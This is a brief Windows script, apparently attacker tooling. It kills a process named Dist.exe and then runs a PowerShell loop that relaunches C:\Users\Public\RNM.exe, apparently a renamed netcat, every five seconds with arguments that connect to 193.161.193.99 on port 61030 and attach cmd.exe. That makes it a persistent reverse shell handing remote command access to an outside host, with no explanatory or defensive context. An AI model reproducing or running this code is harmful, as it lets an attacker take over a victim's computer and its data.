taskkill /F /IM Dist.exe
C:\Users\ALOOO\Downloads\Dist.exe
while ($true) {
    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
    Start-Sleep -Seconds 5
}
